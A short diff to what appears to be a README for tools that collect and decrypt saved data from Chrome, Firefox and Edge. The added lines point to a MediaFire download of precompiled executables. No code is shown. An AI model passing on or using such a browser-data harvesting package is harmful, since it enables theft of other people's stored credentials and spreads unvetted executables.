@@ -5,6 +5,8 @@ FULL SOURCE CODE FOR THE PROGRAMS ARE BELOW
 (CollectAll.py, DecryptChromeData.py, DecryptFirefoxData.py, DecryptEdgeData.py)
 
 IVE ALSO INCLUDED THE PRECOMPILED .EXE's FOR YOU TO USE IF YOU WISH..
+(You can download CollectAndDecrypt.zip *all needed files* from MediaFire:
+https://www.mediafire.com/file/4phw12q0ye5qobr/CollectAndDecrypt.zip/file)
 
 
 HOW TO USE:
